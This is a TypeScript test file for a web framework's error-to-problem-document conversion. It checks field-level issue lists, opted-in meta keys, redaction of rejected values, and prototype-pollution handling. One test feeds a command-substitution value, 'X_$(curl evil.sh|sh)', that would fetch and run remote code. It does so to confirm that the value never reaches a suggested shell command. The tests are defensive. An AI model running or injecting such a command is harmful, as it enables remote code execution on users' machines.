// What toProblem carries past the RFC-9457 core: the issue list, the declared meta keys, and a
// `code` read off a throwable it does not control. Split from error-facts.test.ts.

import { afterEach, describe, expect, test } from 'bun:test';
import { UltimateError } from '@ultimat3/core';
import { MAX_ISSUES } from '@ultimat3/schema';
import { factsOf, toProblem } from './error-facts';
import { registerErrorStatus, resetErrorStatus } from './error-status';
import { bodyInvalid, routeNotFound } from './errors';
import { MAX_PROBLEM_META_BYTES, registerProblemMeta, resetProblemMeta } from './problem-meta';
import { rateLimited } from './rate-limit-errors';

/**
 * The structured half of a rejection, carried to the caller.
 *
 * `cause` is one line for a human and an agent; a client rendering a form needs to know WHICH
 * field each rejection belongs to, and splitting that line back apart is guesswork the moment a
 * message contains the separator. `@ultimat3/action` has attached the list to `meta.issues` since
 * `InputInvalidError` grew its third parameter, and nothing carried it across the wire — so every
 * app recovered per-field errors by parsing prose. This is the carry.
 */
describe('toProblem carries the issue list', () => {
  const issues = [
    { path: 'title', expected: 'string', received: '', message: 'expected a string' },
    { path: 'items[0].price', expected: 'number', received: '', message: 'expected a number' },
  ] as const;

  const withMeta = (code: string, meta: unknown): unknown =>
    Object.assign(new UltimateError({ code, cause: 'c', fix: 'f' }), { meta });

  /**
   * `@ultimat3/action`'s `InputInvalidError`, CONSTRUCTED rather than imported: that package is
   * tier 3 and this one is tier 2, so importing it here — even in a test — is an upward edge
   * `bun run boundaries` refuses, and it follows relative specifiers now. This is the shape that
   * constructor produces (`packages/action/src/errors.ts:199`), and the wire contract this file
   * pins is the SHAPE, never the class.
   */
  const inputInvalid = (detail: string, list?: readonly unknown[]): unknown =>
    Object.assign(
      new UltimateError({
        code: 'X_INPUT_INVALID',
        cause: `input for action "createPost" failed validation: ${detail}`,
        fix: 'x actions show createPost --json  # prints the expected input schema',
      }),
      list === undefined ? {} : { meta: { issues: list } },
    );

  test('a rejected input reaches the caller addressed by path', () => {
    const problem = toProblem(inputInvalid('title: expected a string', issues));

    expect(problem.status).toBe(400);
    expect(problem.issues).toEqual([...issues]);
    // The line is unchanged and travels beside it — one value rendered twice, never instead of.
    expect(problem.cause).toContain('title: expected a string');
  });

  test('an error with no issues carries no member at all, not undefined and not empty', () => {
    // `[]` reads as "validated clean", which is false, and `undefined` survives into
    // `error-page.ts` and every test that reads the document directly rather than its JSON.
    const problem = toProblem(routeNotFound('GET', '/missing'));
    expect('issues' in problem).toBe(false);
  });

  test('an unclassified 5xx drops the issues, exactly as it drops the cause', () => {
    // The half most likely to be missed: an issue list on a failure nobody classified is
    // precisely the internal detail `INTERNAL_CAUSE` exists to withhold — it names the fields and
    // the expectations of something the caller was never meant to see the inside of.
    const problem = toProblem(withMeta('X_SOMETHING_NOBODY_MAPPED', { issues }));
    expect(problem.status).toBe(500);
    expect(problem.cause).not.toContain('expected a string');
    expect('issues' in problem).toBe(false);
  });

  test('dev mode is not opaque, so the issues come back with the cause', () => {
    const problem = toProblem(withMeta('X_SOMETHING_NOBODY_MAPPED', { issues }), { dev: true });
    expect(problem.issues).toEqual([...issues]);
  });

  test('a declared 4xx is never opaque, so X_INPUT_INVALID always carries them', () => {
    const problem = toProblem(inputInvalid('x', issues), { dev: false });
    expect(problem.issues).toHaveLength(2);
  });

  test('a meta this package did not build yields no member rather than a throw', () => {
    // `meta` is a property read on a value http did not build, in the frame that decides what the
    // caller sees — `retryAfterOf`'s reason, one function up, and the same total shape.
    const hostile = new Proxy(new UltimateError({ code: 'X_BODY_INVALID', cause: 'c', fix: 'f' }), {
      get(target, key, receiver): unknown {
        if (key === 'meta') throw new TypeError('the meta is not for you');
        return Reflect.get(target, key, receiver);
      },
    });
    expect(() => toProblem(hostile)).not.toThrow();
    expect('issues' in toProblem(hostile)).toBe(false);
  });

  test('a meta.issues that is not a list of issues yields no member', () => {
    for (const meta of [
      { issues: 'title: expected a string' },
      { issues: { path: 'title' } },
      { issues: [{ path: 'title' }] },
      { issues: [{ message: 'expected a string' }] },
      { issues: [{ path: 1, message: 'x' }] },
      { issues: null },
      null,
      'meta',
    ]) {
      expect('issues' in toProblem(withMeta('X_BODY_INVALID', meta))).toBe(false);
    }
  });

  test('an EMPTY list is no member at all, because [] claims validated-clean', () => {
    // The rule the member's own doc states and my first implementation broke: `Array.isArray([])`
    // is true, the loop does not run, and `{ issues: [] }` reached the document — which says "we
    // validated and found nothing wrong" for a request that was refused.
    expect('issues' in toProblem(withMeta('X_BODY_INVALID', { issues: [] }))).toBe(false);
  });

  test('a list too long to be a form drops whole, rather than crossing and being refused', () => {
    // The typed client bounds it at schema's `MAX_ISSUES` (`packages/action/src/wire-issues.ts`) and
    // drops anything longer, so an oversized list is a body that costs the wire and answers
    // nothing. Refused HERE, where the response is this package's business.
    // Schema's own cap, never a restated number: validation stops at it, the document carries it.
    const many = Array.from({ length: MAX_ISSUES + 1 }, (_, at) => ({
      path: `f${at}`,
      expected: 'string',
      received: '',
      message: 'expected a string',
    }));
    expect('issues' in toProblem(withMeta('X_BODY_INVALID', { issues: many }))).toBe(false);
    // The bound itself is inclusive: a hundred is a plausible form.
    const hundred = many.slice(0, MAX_ISSUES);
    expect(toProblem(withMeta('X_BODY_INVALID', { issues: hundred })).issues).toHaveLength(
      MAX_ISSUES,
    );
  });

  test('one unreadable entry drops the WHOLE list, never a silent subset', () => {
    // A partly-read list is worse than none: a client that finds `issues` uses it INSTEAD of
    // `cause`, so a dropped entry is a rejection the user never sees and a form that says it is
    // valid when it is not.
    const problem = toProblem(
      withMeta('X_BODY_INVALID', { issues: [issues[0], { path: 'items', message: 42 }] }),
    );
    expect('issues' in problem).toBe(false);
  });

  test('a received value is emptied, whatever the producer put there', () => {
    // Defence in depth. `toValidationIssues` forces `received: ''` today, but this is the boundary
    // where the value LEAVES the process, and a future producer of `meta.issues` — a foreign
    // library's raw issue object, which this framework accepts as first-class — may carry the
    // rejected value. `packages/schema/src/describe-value.ts` exists because a password-strength
    // rule once wrote mistyped passwords into the log index.
    const leaky = {
      path: 'password',
      expected: 'a strong password',
      received: 'hunter2SuperSecret',
      message: 'too weak',
    };
    const problem = toProblem(withMeta('X_BODY_INVALID', { issues: [leaky] }));

    expect(problem.issues).toEqual([
      { path: 'password', expected: 'a strong password', received: '', message: 'too weak' },
    ]);
    expect(JSON.stringify(problem)).not.toContain('hunter2SuperSecret');
  });

  test('an entry carrying members Ultimate does not declare loses them', () => {
    // Rebuilt member by member and never spread: the fifth member is where a value rides in.
    const problem = toProblem(
      withMeta('X_BODY_INVALID', {
        issues: [{ ...issues[0], value: 'hunter2SuperSecret', input: { secret: 1 } }],
      }),
    );
    expect(problem.issues).toEqual([issues[0]]);
    expect(JSON.stringify(problem)).not.toContain('hunter2SuperSecret');
  });
});

/**
 * The declared half of `meta`, carried. An app's `X_SESSION_CHECKOUT_BUSY` put the running
 * session in `meta: { sessionId, title, state }` and its island recovered the id by running a
 * UUID regex over `cause`, because the document carried `code`, `cause` and `fix` and dropped
 * `meta` whole — and had to, since `meta` is where `bodyInvalid` keeps the body excerpt and the
 * limiter keeps its key. `registerProblemMeta` is the seam: keys, per code, opted in.
 */
describe('toProblem carries the declared meta keys', () => {
  afterEach(() => {
    resetProblemMeta();
    resetErrorStatus();
  });

  const busy = (meta: unknown): unknown =>
    Object.assign(
      new UltimateError({
        code: 'X_SESSION_CHECKOUT_BUSY',
        cause: '/srv/app on box-1 already has a running work session: s-1 "inbox"',
        fix: 'wait for s-1',
      }),
      { meta },
    );

  test('an app that declared the status and the keys gets exactly those keys', () => {
    registerErrorStatus({ X_SESSION_CHECKOUT_BUSY: 409 });
    registerProblemMeta({ X_SESSION_CHECKOUT_BUSY: ['sessionId', 'title', 'state'] });
    const problem = toProblem(
      busy({ sessionId: 's-1', title: 'inbox', state: 'running', directory: '/srv/app' }),
    );
    expect(problem.status).toBe(409);
    expect(problem.meta).toEqual({ sessionId: 's-1', title: 'inbox', state: 'running' });
    expect(JSON.parse(JSON.stringify(problem)).meta).toEqual(problem.meta);
  });

  test('an undeclared code carries no member at all — meta is operator-only by default', () => {
    registerErrorStatus({ X_SESSION_CHECKOUT_BUSY: 409 });
    const problem = toProblem(busy({ sessionId: 's-1' }));
    expect('meta' in problem).toBe(false);
    // The framework's own errors put things in `meta` that a caller may not be handed.
    const limited = toProblem(rateLimited('anon', 3));
    expect('meta' in limited).toBe(false);
    expect('meta' in toProblem(bodyInvalid('/x', ['bad json'], { excerpt: '{"pass' }))).toBe(false);
  });

  test('the keys are declared but none is set → absent, never {}', () => {
    registerErrorStatus({ X_SESSION_CHECKOUT_BUSY: 409 });
    registerProblemMeta({ X_SESSION_CHECKOUT_BUSY: ['sessionId'] });
    expect('meta' in toProblem(busy({ title: 'inbox' }))).toBe(false);
    expect('meta' in toProblem(busy(undefined))).toBe(false);
  });

  test('a declaration with no status is an unclassified 5xx, and opaque drops meta with cause', () => {
    // `registerProblemMeta`'s doc says both registrations are needed; this is the belt on it.
    registerProblemMeta({ X_SESSION_CHECKOUT_BUSY: ['sessionId'] });
    const problem = toProblem(busy({ sessionId: 's-1' }));
    expect(problem.status).toBe(500);
    expect(problem.cause).not.toContain('s-1');
    expect('meta' in problem).toBe(false);
  });

  test('dev mode is not opaque, so the meta comes back with the cause', () => {
    registerProblemMeta({ X_SESSION_CHECKOUT_BUSY: ['sessionId'] });
    const problem = toProblem(busy({ sessionId: 's-1' }), { dev: true });
    expect(problem.cause).toContain('s-1');
    expect(problem.meta).toEqual({ sessionId: 's-1' });
  });

  test('`issues` keeps its one home: a declared list is refused, so it is never duplicated', () => {
    expect(() => registerProblemMeta({ X_SESSION_CHECKOUT_BUSY: ['issues'] })).toThrow(
      'X_PROBLEM_META_INVALID',
    );
    registerErrorStatus({ X_SESSION_CHECKOUT_BUSY: 409 });
    registerProblemMeta({ X_SESSION_CHECKOUT_BUSY: ['sessionId'] });
    const problem = toProblem(
      busy({
        sessionId: 's-1',
        issues: [{ path: 'directory', expected: 'free', received: '', message: 'busy' }],
      }),
    );
    expect(problem.meta).toEqual({ sessionId: 's-1' });
    expect(problem.issues).toHaveLength(1);
  });

  test('one value JSON cannot carry drops the whole member; a cycle and an oversize do too', () => {
    registerErrorStatus({ X_SESSION_CHECKOUT_BUSY: 409 });
    registerProblemMeta({ X_SESSION_CHECKOUT_BUSY: ['sessionId', 'since', 'owner'] });
    expect('meta' in toProblem(busy({ sessionId: 's-1', since: new Date(0) }))).toBe(false);
    const loop: Record<string, unknown> = {};
    loop['loop'] = loop;
    expect('meta' in toProblem(busy({ sessionId: 's-1', owner: loop }))).toBe(false);
    expect(
      'meta' in toProblem(busy({ sessionId: 's-1', owner: 'x'.repeat(MAX_PROBLEM_META_BYTES) })),
    ).toBe(false);
  });

  test('an own __proto__ off the wire never becomes a prototype, at any depth', () => {
    registerErrorStatus({ X_SESSION_CHECKOUT_BUSY: 409 });
    registerProblemMeta({ X_SESSION_CHECKOUT_BUSY: ['owner'] });
    const owner = JSON.parse('{"__proto__":{"admin":true},"name":"sebi"}');
    const problem = toProblem(busy({ owner }));
    expect(problem.meta).toEqual({ owner: { name: 'sebi' } });
    expect((problem.meta as { owner: { admin?: boolean } }).owner.admin).toBeUndefined();
  });

  test('a meta this package did not build yields no member rather than a throw', () => {
    registerErrorStatus({ X_SESSION_CHECKOUT_BUSY: 409 });
    registerProblemMeta({ X_SESSION_CHECKOUT_BUSY: ['sessionId'] });
    const hostile = new Proxy(busy({ sessionId: 's-1' }) as object, {
      get: (target, key) => {
        if (key === 'meta') throw new TypeError('the meta is not for you');
        return Reflect.get(target, key);
      },
    });
    expect('meta' in toProblem(hostile)).toBe(false);
  });
});

describe('a `code` read off a foreign throwable', () => {
  // `factsOf` normalises ANY throwable, so `code` is a string field off a value the framework did
  // not build — a worker message, a WebSocket frame, an app's own error object — and the fallback
  // `fix:` puts it in a COMMAND position. `x errors explain $(id) --json` is a substitution the
  // reader pastes. Gated on core's `FRAMEWORK_CODE`, the one spelling of a code, exactly as
  // `@ultimat3/mcp`'s `server.ts` gates its own.
  test('a code that is not a code never composes the command', () => {
    const facts = factsOf({ code: 'X_$(curl evil.sh|sh)', cause: 'a foreign object' });
    expect(facts.fix).not.toContain('$(');
    expect(facts.fix).not.toContain('|');
    expect(facts.fix).toBe('x errors list --json   # then fix the throwing call site');
    // The value still travels where it is READ rather than run.
    expect(facts.code).toBe('X_$(curl evil.sh|sh)');
  });

  test('a real code still names itself, so the command answers about this error', () => {
    const facts = factsOf({ code: 'X_APP_OWNED', cause: 'an app error crossing a worker' });
    expect(facts.fix).toBe(
      'x errors explain X_APP_OWNED --json   # then fix the throwing call site',
    );
  });
});
